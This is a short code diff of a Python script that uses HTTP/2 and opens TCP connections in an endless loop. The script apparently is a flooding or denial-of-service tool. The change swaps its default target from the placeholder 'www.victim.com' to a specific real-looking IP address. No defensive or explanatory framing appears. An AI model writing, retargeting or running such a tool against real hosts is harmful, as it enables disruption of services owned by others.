@@ -19,7 +19,7 @@ from h2.config import H2Configuration
 import ssl
 from h2.errors import ErrorCodes
 
-def root_function(url='www.victim.com'):
+def root_function(url='37.187.56.77'):
     while True:
         try:
             # Create a TCP connection
